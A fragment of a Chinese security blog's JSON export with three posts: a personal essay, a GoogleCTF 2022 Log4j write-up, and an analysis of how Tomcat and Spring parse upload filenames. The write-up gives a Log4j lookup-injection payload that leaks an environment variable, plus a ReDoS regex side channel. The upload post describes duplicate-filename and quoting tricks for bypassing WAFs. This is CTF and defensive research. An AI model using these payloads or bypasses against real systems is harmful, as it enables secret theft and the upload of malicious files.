Jxpath","slug":"Apache-Commons-Jxpath","permalink":"https://y4tacker.github.io/tags/Apache-Commons-Jxpath/"}]},{"title":"临行随笔","slug":"year/2022/7/临行随笔","date":"2022-07-09T15:40:31.000Z","updated":"2024-08-04T09:01:49.689Z","comments":true,"path":"2022/07/09/year/2022/7/临行随笔/","link":"","permalink":"https://y4tacker.github.io/2022/07/09/year/2022/7/%E4%B8%B4%E8%A1%8C%E9%9A%8F%E7%AC%94/","excerpt":"","text":"临行随笔临走了，简单谈谈我的感受，最近几年带给我的成长无疑是巨大的，从什么时候开始感觉自己真正成长呢？其实有几个瞬间，一是我能放弃现实追逐理想，二是我发现我的表达欲正在逐渐消失(能慢慢专注于提高自己)，三是拥有一颗平淡的心，关于这点之后会慢慢说来 正式进入川大前我读了一年预科，这一年其实给我带来了很多，从高中心里的阴霾走了出来(现在一直觉得高中那会儿我很傻，从阳光到孤独)，到了大学新的环境我犹如新生一般，慢慢开始接纳新的事物，本来走向阴郁的心开始打开，这一年里我蜕变了很多，体重从144降低到120以下，重新变得爱笑，变得喜欢在人前表现自己，这一年当中我感觉到我活出了自己，这是最有意义的一刻，但其实我知道这一切都是健身给我带来的，每天三小时的训练让我学会了忍耐，学会了付出，这一年里我很开心，也很伤心，我很开始是因为我发现我用心对待周围的同学，帮他们解决他们的问题，我很伤心是因为他们说我是老师的舔狗，我那时就在想，我不求成绩，不求回报，只是一味的喜欢表现自己帮助他人，虽然那时候我可能真的有些地方不太会说话(这来自于我本能的肆无忌惮)，特别是最后由于预科最后需要综合成绩选专业，我那时候第一次感觉到为什么明明就是学生，为什么可以这么势力，为什么可以无缘无故喷人，在那时候我才发现原来这里不再是高中，无人管控人性在释放，还记得在最后一次听老师安排下帮女同学们搬完宿舍，那时候我终于控制不住了，我在女生宿舍下的长凳上哭的很伤心，伤心真心付出被伤害，伤心别人的不理解，其实我知道在那一刻开始我慢慢变得不再热心，但那时候的我可没意识到 那时候还不错综合排名前几名，选到了自己想选择的网安，至于为什么选择这个专业理由很简单，我从来不是因为钱选择成为一名黑客，小时候还记得初中就看着网上那些黑客的故事很酷，但自己没有老师找不到教程(不会搜索引擎)，但那时候我却阴差阳错学了一些易语言，会一点简单的编程做过一些好玩的小软件，喜欢瞎点家里的电脑，记得那时候挖到一个漏洞(那时候还没意识到这就是黑客)，是一个搜题软件的，本来靠每天签到回答问题才能获得寥寥无几的金币，但我通过接口泄漏成功得到几亿金币，在那一天我疯狂的看别人的付费帖子开心的像个傻子，但也止步于此了，应试教育让我不得不放弃并且那时候也从没认识到这会是未来的一个职业，高中高考前无聊也学了一些c语言，还记得别人在复习而我在纸上手写代码的日子，虽然只有短短几天，原因也是因为书籍写的晦涩难懂加上我没有编程的思想 到了网安专业，大一那一年，我仍然迷茫，我只知道我要上好每一堂课，但是越学越迷茫，于是我拼了命的去学习课表上的高数，线性代数，还有一些通识课程，但我不快乐，我能深深感受到真正快乐的时候是我在c语言课堂上我如痴如醉的听着老师讲着我不会的东西，还在课下通过网上的例子学会了飞机大战这也是我第一个学习的游戏，当然也是最后一个游戏，我还热爱计算机系统导论课程，原因则只是因为太过简单，别人拼了命的学习也不如我课题摸鱼的成果，而我知道这些得益于我小时候喜欢喜欢折腾电脑有关，也只有这两节课让我感受到了我在学习计算机，哦对了，还有CTF新生赛虽然被暴打但是题目也不是特别难，让我第一次接触到了一丝的安全，可是也只是仅限于一些简单的F12，F5,burpsuite，hackbar? 真正让我开始产生脱变的时候还是大一下，由于疫情我只能呆在家里，由于网课的无聊我开始学习python，开始走向开发(其实是爬虫)，我写了半年的爬虫学会了数据分析，学会了正则匹配，学会了做一些词云图，也学会了一些简单的反爬机制的绕过，这学期我还因为黄老师的课学会了面向对象的开发，第一次入手Java开发，不仅用python实现了很多便捷的脚本，同时又转化为Java，还学会了Java web，特别是课程上写一堆屎一样的代码但实现了最终的功能的那段时间里我很开心，开心我能学以致用，也很开心通过半年的开发学习，至少因为这些基础我攻防世界新手区的题我能独立完成，高手区也能做一两道，但我又很伤心，伤心在于我在学高数，在学大学物理，一样的迷茫，我买了本精简版的吉米多维奇的书刷题刷我的高数，刷我的概率统计，我像疯了一样的把厚厚的两本书都做了一两遍，但越做我越迷茫，特别是当我看到我高数成绩98分，当我得知我综合排名第三的那一刻我更慌了，为什么？因为我不知道这一年内我学会了什么？我好像什么都学了，但是我好像又什么都不会，我只知道我会高数，我数学很牛逼！但我似乎不太会网络安全，当时我在好兄弟的寝室做了一个重大的决定，我屁股坐在他的滑板上就在寝室当中往前滑又往后滑，最后我挣扎了很久放弃保研的路，为什么会挣扎？因为我成绩太好了，我其实很舍不得我那个名次？但我意识到那不是我所热爱的 就这样到了大二，我开始疯狂恶补网安的知识看着网络上各个前辈发的视频，我很过瘾OWASP TOP10的原理我基本上都懂了，这时候由于我的努力被校队的CTF战队看上了，我成功进入了梦寐以求的战队，又疯狂开始刷CTF题，先是简单的攻防世界的题，很好高手区做了一页很满足，后面太难我看不懂没做了，又去刷CTFHUB技能树还有BUGKU，刷了两三遍吧，不断重复不断思考，但我还是难受，总觉得还是少了点什么，后面我知道了是那股激情，而这股激情来源于我第一次忍下心花了99元买了CTFSHOW的VIP，我很爽，拿着一个又一个的一血，最开心的时候莫过于刷了一题打开群聊，里面显示着“恭喜Y4tacker获得xxx分类xxx题一血/二血/三血”，就这样过了半年，到了大二上尾声那段时间我又迷茫了，我不知道我能做什么，比赛题我都不会就会点简单的，就在家里麻木的做着CTFSHOW，后面不知道怎么的突然开窍了，AK了很多比赛也赢得了一点小名声又把我救了回来，可是感受着别人的吹捧，我又陷入了迷茫，因为这时候我到了大二下，听学长说到了大三就要实习了，但我不会实战，我只会做一些题，我到底能干什么？那时候我不太喜欢黑盒因为我基础不扎实，因为我菜，因此我选择了白盒，从第一次打开PHP代码，一行一行搜着我不懂的函数，到后面我能完整分析一个简单的框架，中途收获了很多CNVD通用编号，也通过一个月赚到了CNVD一千多块钱的京东卡给家里买了东西，我很开心，但后面我意识到我只有很小一部分漏洞危害很大其他的说白了就是垃圾洞，什么反序列化链，什么后台RCE，特别是当时看到一个师傅说反序列化也算洞？我又开始迷茫了，为了逃避我拉黑了那位师傅，这也是第一次拉黑一个人，虽然我知道做法不对，但我真的很难受，在那时候我开始提交CVE，但没什么思路只是把我最屌的两个洞从CNVD搬到了CVE而已，也仅此而已，在这期间我又AK了很多比赛，但还是走不出心里的怪圈，开始变得孤独(因为打比赛很孤独只有我自己做一个方向)，但我也变得更爱思考 再到后来国赛，强网杯都拿到奖后，我又迷茫了，这一次是因为我大三了，眼看着就快准备实习了我发现我太菜了，我时常问我自己，只会做点题有什么意义？于是我开始拓展我的知识面，阴差阳错进了p神的代码审计星球，心里付款的时候还是很难受(不习惯知识付费，平时都是网上白嫖资料)，但后来进去以后又觉得很值得，因为我从这里学会了一点Java安全，从一开始懵懵懂懂到后面能结合实际思考我想这方面得益于p牛文字的魅力(p牛是一个很有意思的黑客，他喜欢去思考开发为什么会这样写？这样写的意义是什么？)，后来从无知到能做一点Java的CTF题，再到能AK比赛的Java题，这段过程也是奇妙的，后面我发现我经常遗忘于是又写了个JavaSec的github仓库，一开始内容很烂粗制滥造，但慢慢写的写的看着内容逐渐丰富，对代码的思考注解深入，对实战的理解也逐步加深，这个时候我觉得是很有趣的，虽然那时候不会Java审计挖洞，但我学的时候总会往实战方面想，虽然有些东西不一定能用，但我学会了思考，之后到了大三上期末我又迷茫了，第一次面试就面试大厂我真的手足无措，明明很多会的但就是说不出来，我开始自闭开始觉得自己就是一个废物，但最终还是花了半个月走了出去，总结了教训以后后面又面了长亭，很开心我第一次通过了面试可是因为疫情原因封校我又不得不推掉这份实习，后来到了春节我很无聊，看着阿里云举办的webshell挑战赛本着学习的态度，从绞尽脑汁花一天时间搞出个绕过的样本，到后面思路注解打开最终也拿到了第三名的名次，可以负责任的说那时候我不知道java的webshell该如何写我只知道Runtime.getRuntime.exec()也只知道还可以通过反射可以调用更底层去使其变得更复杂到我回去深入思考，会去对实战与代码的碰撞，会从编译的角度构造畸形webshell，当然也只是很皮毛，但无疑那十多天我很开心交了十多个样本赚了一万多块钱，后面也终于到了实习的时候，我也认真准备投了好几个地方，很开心都过了但我还是想去阿里云尽管它的流程很慢，尽管中间有一段锁hc的插曲，但功夫不负有心人，徐师能看中我，能信任我，我很开心，但我也很迷茫因为我始终是觉得自己菜的，但我不想辜负主管对我的期望，也希望我能最终实现自己的目标，能变得更厉害，当然中间还有一段小插曲我发现虽然躺平两年，得益于我的成绩我的竞赛我发现居然还能保研，然后得到某top高校认可，可是我终究还是觉得读研不适合我，我终究还是为了理想忘掉了现实，但结果也不赖不是么？ 在这一刻我真正觉得自己有所成长，不在乎外面的说法，能知道我想要什么，还有较低的社交欲望。虽然未来我仍然迷茫，虽然我不是很强，但是我还是要继续向前，不为其他的，就为了能实现儿时的梦！","categories":[{"name":"随笔","slug":"随笔","permalink":"https://y4tacker.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://y4tacker.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"GoogleCTF2022-Log4j","slug":"year/2022/7/GoogleCTF2022-Log4j","date":"2022-07-06T03:08:26.000Z","updated":"2024-08-04T09:01:49.668Z","comments":true,"path":"2022/07/06/year/2022/7/GoogleCTF2022-Log4j/","link":"","permalink":"https://y4tacker.github.io/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/","excerpt":"","text":"GoogleCTF2022-Log4j写在前面唯一一个Java题了，挺有意思的一道题学到很多 题目附件：https://github.com/google/google-ctf/tree/master/2022/web-log4j 非预期分析题目给了一个公网环境(题目似乎没有重启，能猜到不可能是RCE)以及附件压缩包，里面同时有python以及java的环境，先简单看看python的，这里运行了web服务，将输入作为分割传入chat函数后通过subprocess调用命令执行并返回结果，这里不存在命令注入 123456789101112131415161718192021222324252627app = Flask(__name__)@app.route(&quot;/&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def start(): if request.method == &#x27;POST&#x27;: text = request.form[&#x27;text&#x27;].split(&#x27; &#x27;) cmd = &#x27;&#x27; if len(text) &lt; 1: return (&#x27;invalid message&#x27;, 400) elif len(text) &lt; 2: cmd = text[0] text = &#x27;&#x27; else: cmd, text = text[0], &#x27; &#x27;.join(text[1:]) result = chat(cmd, text) return result return render_template(&#x27;index.html&#x27;)def chat(cmd, text): # run java jar with a 10 second timeout res = subprocess.run([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;-Dcmd=&#x27; + cmd, &#x27;chatbot/target/app-1.0-SNAPSHOT.jar&#x27;, &#x27;--&#x27;, text], capture_output=True, timeout=10) print(res.stderr.decode(&#x27;utf8&#x27;)) return res.stdout.decode(&#x27;utf-8&#x27;)if __name__ == &#x27;__main__&#x27;: port = os.environ[&#x27;PORT&#x27;] if &#x27;port&#x27; in os.environ else 1337 app.run(host=&#x27;0.0.0.0&#x27;, port=port) 因此重点就是分析这个java的文件，很简单的代码(同时可以看到这里有LOG4J2) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import java.lang.System;import java.time.format.DateTimeFormatter;import java.time.LocalDateTime;public class App &#123; public static Logger LOGGER = LogManager.getLogger(App.class); public static void main(String[]args) &#123; //获取环境变量当中的flag,同时这里可以知道我们需要获取到环境变量 String flag = System.getenv(&quot;FLAG&quot;); if (flag == null || !flag.startsWith(&quot;CTF&quot;)) &#123; LOGGER.error(&quot;&#123;&#125;&quot;, &quot;Contact admin&quot;); &#125; //日志输出命令行参数 LOGGER.info(&quot;msg: &#123;&#125;&quot;, args); // TODO: implement bot commands String cmd = System.getProperty(&quot;cmd&quot;); if (cmd.equals(&quot;help&quot;)) &#123; doHelp(); return; &#125; if (!cmd.startsWith(&quot;/&quot;)) &#123; System.out.println(&quot;The command should start with a /.&quot;); return; &#125; //根据命令行参数执行doCommand，简单可以看出这里没什么利用 doCommand(cmd.substring(1), args); &#125; private static void doCommand(String cmd, String[] args) &#123; switch(cmd) &#123; case &quot;help&quot;: doHelp(); break; case &quot;repeat&quot;: System.out.println(args[1]); break; case &quot;time&quot;: DateTimeFormatter dtf = DateTimeFormatter.ofPattern(&quot;yyyy/M/d H:m:s&quot;); System.out.println(dtf.format(LocalDateTime.now())); break; case &quot;wc&quot;: if (args[1].isEmpty()) &#123; System.out.println(0); &#125; else &#123; System.out.println(args[1].split(&quot; &quot;).length); &#125; break; default: System.out.println(&quot;Sorry, you must be a premium member in order to run this command.&quot;); &#125; &#125; private static void doHelp() &#123; System.out.println(&quot;Try some of our free commands below! \\nwc\\ntime\\nrepeat&quot;); &#125;&#125; 同时发现这里有个log4j2.xml的配置文件 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;INFO&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_ERR&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; %-5level %logger&#123;36&#125; executing $&#123;sys:cmd&#125; - %msg %n&quot;&gt; &lt;/PatternLayout&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;debug&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 可以看见这里的Root的level设置为debug，这代表如果没有单独指定Logger， 那么就会使用该Root日志输出输出，因此就算我们能解析到$&#123;env:FLAG&#125;也不可能拿到结果(因为这是在日志而不是标准输出当中)，因此我们有没有办法讲结果输出到标准输出呢，当然答案是有的也造成了这次非预期，如果我们单独设置了Logger的话，如果那个日志策略会输出到标准输出那么就可以解决这个问题 这里说一下其中一个就可以，也就是这个org.apache.logging.log4j.core.lookup.ResourceBundleLookup，要执行LOGGER.warn只需要满足下面两个条件之一即可，这里简单测试一下$&#123;bundle:2333&#125; 发现这个LOGGER确实能将关键信息带到标准输出 因此我们只需要输入$&#123;bundle:$&#123;env:FLAG&#125;&#125;即可 1$&#123;$&#123;a:-b&#125;undle:$&#123;env:FLAG&#125;&#125; 预期分析-redos猜测可能是非预期了所以搞了个新的题，将同样的payload输入后页面只是显示Sensitive information detected in output. Censored for security reasons. 这里会检测内容，根据猜测能够知道肯定是把那个ResourceBundleLookup下的LOGGER.warn的输出特征给过滤掉了，这里简单fuzz下证实了我的猜测，毕竟这里是有doCommand功能 1234567891011121314151617181920212223private static void doCommand(String cmd, String[] args) &#123; switch(cmd) &#123; case &quot;help&quot;: doHelp(); break; case &quot;repeat&quot;: System.out.println(args[1]); break; case &quot;time&quot;: DateTimeFormatter dtf = DateTimeFormatter.ofPattern(&quot;yyyy/M/d H:m:s&quot;); System.out.println(dtf.format(LocalDateTime.now())); break; case &quot;wc&quot;: if (args[1].isEmpty()) &#123; System.out.println(0); &#125; else &#123; System.out.println(args[1].split(&quot; &quot;).length); &#125; break; default: System.out.println(&quot;Sorry, you must be a premium member in order to run this command.&quot;); &#125;&#125; 只需要通过repeat功能即可，成功验证了猜想，因此不需要考虑payload的问题了 那怎么半呢其实这里还有一个小细节，对于log4j2的日志的实现来说其实是先将$&#123;xx&#125;当中的内容做替换再按我们规定的输出格式输出(如果是你去实现这样的功能相信这是目前为止的最优解)，具体代码这里就不展开了，接着说明 其实log4j2对日志输出中的%d/%p等其实是有自己的实现的，它有个注解比如下面这个是%d的他们都是有个注解ConverterKeys，因此我们可以看看这个有没有一些神奇的东西可以配合我们完成 如何扫描并获取包下被指定注解的类为了方便我这里直接用了reflections 框架（此框架依赖com.google.guava） 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.reflections&lt;/groupId&gt; &lt;artifactId&gt;reflections&lt;/artifactId&gt; &lt;version&gt;0.9.11&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;21.0&lt;/version&gt;&lt;/dependency&gt; 因此我们可以扫描指定包下的 12345678910Reflections f = new Reflections(&quot;org.apache.logging.log4j.core&quot;);Set&lt;Class&lt;?&gt;&gt; set = f.getTypesAnnotatedWith(ConverterKeys.class);for (Class&lt;?&gt; tmp:set)&#123; if (tmp.isInterface())&#123; System.out.println(&quot;interface:&quot;+tmp.getName()); &#125;else &#123; System.out.println(&quot;class:&quot;+tmp.getName()); &#125;&#125; 得到如下结果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class:org.apache.logging.log4j.core.pattern.VariablesNotEmptyReplacementConverterclass:org.apache.logging.log4j.core.pattern.UuidPatternConverterclass:org.apache.logging.log4j.core.pattern.LineLocationPatternConverterclass:org.apache.logging.log4j.core.pattern.HighlightConverterclass:org.apache.logging.log4j.core.pattern.LevelPatternConverter$SimpleLevelPatternConverterclass:org.apache.logging.log4j.core.pattern.ThreadIdPatternConverterclass:org.apache.logging.log4j.core.pattern.IntegerPatternConverterclass:org.apache.logging.log4j.core.pattern.ClassNamePatternConverterclass:org.apache.logging.log4j.core.pattern.ProcessIdPatternConverterclass:org.apache.logging.log4j.core.pattern.MaxLengthConverterclass:org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Yellowclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Greenclass:org.apache.logging.log4j.core.pattern.RootThrowablePatternConverterclass:org.apache.logging.log4j.core.pattern.MethodLocationPatternConverterclass:org.apache.logging.log4j.core.pattern.MessagePatternConverterclass:org.apache.logging.log4j.core.pattern.DatePatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Whiteclass:org.apache.logging.log4j.core.pattern.EqualsIgnoreCaseReplacementConverterclass:org.apache.logging.log4j.core.pattern.NdcPatternConverterclass:org.apache.logging.log4j.core.pattern.SequenceNumberPatternConverterclass:org.apache.logging.log4j.core.pattern.RepeatPatternConverterclass:org.apache.logging.log4j.core.pattern.EncodingPatternConverterclass:org.apache.logging.log4j.core.pattern.MdcPatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Magentaclass:org.apache.logging.log4j.core.pattern.MessagePatternConverter$SimpleMessagePatternConverterclass:org.apache.logging.log4j.core.pattern.RegexReplacementConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Blackclass:org.apache.logging.log4j.core.pattern.ThreadNamePatternConverterclass:org.apache.logging.log4j.core.pattern.NanoTimePatternConverterclass:org.apache.logging.log4j.core.pattern.RelativeTimePatternConverterclass:org.apache.logging.log4j.core.pattern.FileLocationPatternConverterclass:org.apache.logging.log4j.core.pattern.MessagePatternConverter$RenderingPatternConverterclass:org.apache.logging.log4j.core.pattern.LevelPatternConverterclass:org.apache.logging.log4j.core.pattern.FileDatePatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Cyanclass:org.apache.logging.log4j.core.pattern.EqualsReplacementConverterclass:org.apache.logging.log4j.core.pattern.ThrowablePatternConverterclass:org.apache.logging.log4j.core.pattern.LoggerFqcnPatternConverterclass:org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverterclass:org.apache.logging.log4j.core.pattern.ThreadPriorityPatternConverterclass:org.apache.logging.log4j.core.pattern.MessagePatternConverter$FormattedMessagePatternConverterclass:org.apache.logging.log4j.core.pattern.MarkerSimpleNamePatternConverterclass:org.apache.logging.log4j.core.pattern.EndOfBatchPatternConverterclass:org.apache.logging.log4j.core.pattern.FullLocationPatternConverterclass:org.apache.logging.log4j.core.pattern.MapPatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Redclass:org.apache.logging.log4j.core.pattern.MarkerPatternConverterclass:org.apache.logging.log4j.core.pattern.LoggerPatternConverterclass:org.apache.logging.log4j.core.pattern.LevelPatternConverter$LevelMapLevelPatternConverterclass:org.apache.logging.log4j.core.pattern.StyleConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Blue 选择合适的类完成challenge这里引起我注意的有两个类，一个是和正则相关，一个是和重复相关的英文吸引了我 12class:org.apache.logging.log4j.core.pattern.RegexReplacementConverterclass:org.apache.logging.log4j.core.pattern.RepeatPatternConverter 对应使用为 %replace&#123;abc&#125;&#123;a&#125;&#123;d&#125;=&gt;adc %repeat&#123;a&#125;&#123;3&#125;=&gt;aaa 分别看看RegexReplacementConverter RepeatPatternConverter 结合这两个功能就能大胆猜想能否通过repeat构造超长字符串来消耗正则引擎的性能呢？答案是否？其实代码里很清楚了，只有RegexReplacementConverter有个List&lt;PatternFormatter&gt; formatters = parser.parse(options[0]);这个parse的操作并且这个0决定只能在第一位，第一位是什么就是要替换的类，而repeat里面显然没有，因此这两个也不能嵌套去完成这个题目了 那么还有什么方式呢？那就是redos，我们只需要构造一个包含具有自我重复的重复性分组的正则表达式即可，比如在Cookia师傅的博文当中找到的(毕竟我懒) 因此我们可以构造正则^.&#123;x&#125;(.).*$，其中x为数字，分别获取第一….n位对其进行重复之后再在后面加上任意字符x，其实就是构造出aaaaaaaax的形式 但我发现在jdk8上能成功的redos却在打的时候没用？那个给的docker我也没法构建，后面发现高版本jdk9+以后和jdk8上的有区别 可以看到RSPEC-2631中发现ReDoS 问题已在 Java 9 及更高版本中处理，但是功夫不负有心人，又在stackoverflow的主题is-java-redos-vulnerable当中发现，明显可以看到这句话通过增加()来增加复杂度，但是这次我在本地9-11版本(当然每个大版本我只有一个小版本的jre可能不全面)都测试通过成功redos 但是在题目环境仍然是完成解析告诉我Sensitive information detected in output. Censored for security reasons. 最后我决定再为它加点复杂度也就是在最后加一个$，也就是((C+)+)+$ 接下来就是写个脚本慢慢跑的问题，也是看心态和代理给不给力的问题 参考文章https://blog.csdn.net/Q176782/article/details/78288734 http://cookia.cc/2017/09/13/redos/ https://www.cnblogs.com/ggband/p/11668879.html https://rules.sonarsource.com/java/RSPEC-2631 https://stackoverflow.com/questions/53048859/is-java-redos-vulnerable","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/tags/CTF/"},{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Log4j2","slug":"Log4j2","permalink":"https://y4tacker.github.io/tags/Log4j2/"}]},{"title":"探寻Java文件上传流量层面waf绕过姿势系列二","slug":"year/2022/6/探寻Java文件上传流量层面waf绕过姿势系列二","date":"2022-06-21T12:32:35.000Z","updated":"2024-08-04T09:01:49.640Z","comments":true,"path":"2022/06/21/year/2022/6/探寻Java文件上传流量层面waf绕过姿势系列二/","link":"","permalink":"https://y4tacker.github.io/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/","excerpt":"","text":"探寻Java文件上传流量层面waf绕过姿势系列二写在前面这篇和上篇不同的是上篇更多关注于RFC文档规范的部分，而这篇更关注于如何从代码层面上的利用来绕过，具体内容请接着往下看 正文tomcat灵活的parseQuotedToken继续看看这个解析value的函数，它有两个终止条件，一个是走到最后一个字符，另一个是遇到; 如果我们能灵活控制终止条件，那么waf引擎在此基础上还能不能继续准确识别呢？ 123456789101112131415161718192021private String parseQuotedToken(final char[] terminators) &#123; char ch; i1 = pos; i2 = pos; boolean quoted = false; boolean charEscaped = false; while (hasChar()) &#123; ch = chars[pos]; if (!quoted &amp;&amp; isOneOf(ch, terminators)) &#123; break; &#125; if (!charEscaped &amp;&amp; ch == &#x27;&quot;&#x27;) &#123; quoted = !quoted; &#125; charEscaped = (!charEscaped &amp;&amp; ch == &#x27;\\\\&#x27;); i2++; pos++; &#125; return getToken(true);&#125; 如果你理解了上面的代码你就能构造出下面的例子 同时我们知道jsp如果带&quot;符号也是可以访问到的，因此我们还可以构造出这样的例子 还能更复杂点么，当然可以的结合这里的\\，以及上篇文章当中提到的org.apache.tomcat.util.http.parser.HttpParser#unquote中对出现\\后参数的转化操作，这时候如果waf检测引擎当中是以最近&quot;&quot;作为一对闭合的匹配，那么waf检测引擎可能会认为这里上传的文件名是y4tacker.txt\\,从而放行 变形之双写filename*与filename这个场景相对简单 首先tomcat的org.apache.catalina.core.ApplicationPart#getSubmittedFileName的场景下，文件上传解析header的过程当中，存在while循环会不断往后读取，最终会将key/value以Haspmap的形式保存，那么如果我们写多个那么就会对其覆盖，在这个场景下绕过waf引擎没有设计完善在同时出现两个filename的时候到底取第一个还是第二个还是都处理，这些差异性也可能导致出现一些新的场景 同时这里下面一方面会删除最后一个* 另一方面如果lowerCaseNames为true，那么参数名还会转为小写，恰好这里确实设置了这一点 因此综合起来可以写出这样的payload，当然结合上篇还可以变得更多变这里不再讨论 变形之编码误用假设这样一个场景，waf同时支持多个语言，也升级到了新版本会解析filename*，假设go当中有个编码叫y4，而java当中没有，waf为了效率将两个混合处理，这样会导致什么问题呢？ 如果没有,这里报错后会保持原来的值，因此我认为这也可以作为一种绕过思路？ 123456try &#123; paramValue = RFC2231Utility.hasEncodedValue(paramName) ? RFC2231Utility.decodeText(paramValue) : MimeUtility.decodeText(paramValue);&#125; catch (final UnsupportedEncodingException e) &#123; // let&#x27;s keep the original value in this case&#125; Spring4这里我用了springboot1.5.20RELEASE+springframework4.3.23，这里不去研究小版本间是否有差异只看看大版本了 猜猜我在第几层说个前提这里只针对单文件上传的情况，虽然这里的代码逻辑一眼看出不能有上面那种存在双写的问题，但是这里又有个更有趣的现象 我们来看看这个extractFilename函数里面到底有啥骚操作吧，这里靠函数indexOf去定位key(filename=/filename*=)再做截取操作 1234567891011121314151617181920212223242526private String extractFilename(String contentDisposition, String key) &#123; if (contentDisposition == null) &#123; return null; &#125; else &#123; int startIndex = contentDisposition.indexOf(key); if (startIndex == -1) &#123; return null; &#125; else &#123; String filename = contentDisposition.substring(startIndex + key.length()); int endIndex; if (filename.startsWith(&quot;\\&quot;&quot;)) &#123; endIndex = filename.indexOf(&quot;\\&quot;&quot;, 1); if (endIndex != -1) &#123; return filename.substring(1, endIndex); &#125; &#125; else &#123; endIndex = filename.indexOf(&quot;;&quot;); if (endIndex != -1) &#123; return filename.substring(0, endIndex); &#125; &#125; return filename; &#125; &#125;&#125; 这时候你的反应应该会和我一样，套中套之waf你猜猜我是谁 当然我们也可以不要双引号，让waf哭去吧 Spring5同样是springboot2.6.4+springframework5.3，这里不去研究小版本间是否有差异只看看大版本了 “双写”绕过来看看核心部分 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public static ContentDisposition parse(String contentDisposition) &#123; List&lt;String&gt; parts = tokenize(contentDisposition); String type = (String)parts.get(0); String name = null; String filename = null; Charset charset = null; Long size = null; ZonedDateTime creationDate = null; ZonedDateTime modificationDate = null; ZonedDateTime readDate = null; for(int i = 1; i &lt; parts.size(); ++i) &#123; String part = (String)parts.get(i); int eqIndex = part.indexOf(61); if (eqIndex == -1) &#123; throw new IllegalArgumentException(&quot;Invalid content disposition format&quot;); &#125; String attribute = part.substring(0, eqIndex); String value = part.startsWith(&quot;\\&quot;&quot;, eqIndex + 1) &amp;&amp; part.endsWith(&quot;\\&quot;&quot;) ? part.substring(eqIndex + 2, part.length() - 1) : part.substring(eqIndex + 1); if (attribute.equals(&quot;name&quot;)) &#123; name = value; &#125; else if (!attribute.equals(&quot;filename*&quot;)) &#123; //限制了如果为null才能赋值 if (attribute.equals(&quot;filename&quot;) &amp;&amp; filename == null) &#123; if (value.startsWith(&quot;=?&quot;)) &#123; Matcher matcher = BASE64_ENCODED_PATTERN.matcher(value); if (matcher.find()) &#123; String match1 = matcher.group(1); String match2 = matcher.group(2); filename = new String(Base64.getDecoder().decode(match2), Charset.forName(match1)); &#125; else &#123; filename = value; &#125; &#125; else &#123; filename = value; &#125; &#125; else if (attribute.equals(&quot;size&quot;)) &#123; size = Long.parseLong(value); &#125; else if (attribute.equals(&quot;creation-date&quot;)) &#123; try &#123; creationDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME); &#125; catch (DateTimeParseException var20) &#123; &#125; &#125; else if (attribute.equals(&quot;modification-date&quot;)) &#123; try &#123; modificationDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME); &#125; catch (DateTimeParseException var19) &#123; &#125; &#125; else if (attribute.equals(&quot;read-date&quot;)) &#123; try &#123; readDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME); &#125; catch (DateTimeParseException var18) &#123; &#125; &#125; &#125; else &#123; int idx1 = value.indexOf(39); int idx2 = value.indexOf(39, idx1 + 1); if (idx1 != -1 &amp;&amp; idx2 != -1) &#123; charset = Charset.forName(value.substring(0, idx1).trim()); Assert.isTrue(StandardCharsets.UTF_8.equals(charset) || StandardCharsets.ISO_8859_1.equals(charset), &quot;Charset should be UTF-8 or ISO-8859-1&quot;); filename = decodeFilename(value.substring(idx2 + 1), charset); &#125; else &#123; filename = decodeFilename(value, StandardCharsets.US_ASCII); &#125; &#125; &#125; return new ContentDisposition(type, name, filename, charset, size, creationDate, modificationDate, readDate);&#125; spring5当中又和spring4逻辑有区别，导致我们又可以”双写”绕过(至于为什么我要打引号可以看看我代码中的注释)，因此如果我们先传filename=xxx再传filename*=xxx，由于没有前面提到的filename == null的判断，造成可以覆盖filename的值 同样我们全用filename*也可以实现双写绕过，和上面一个道理 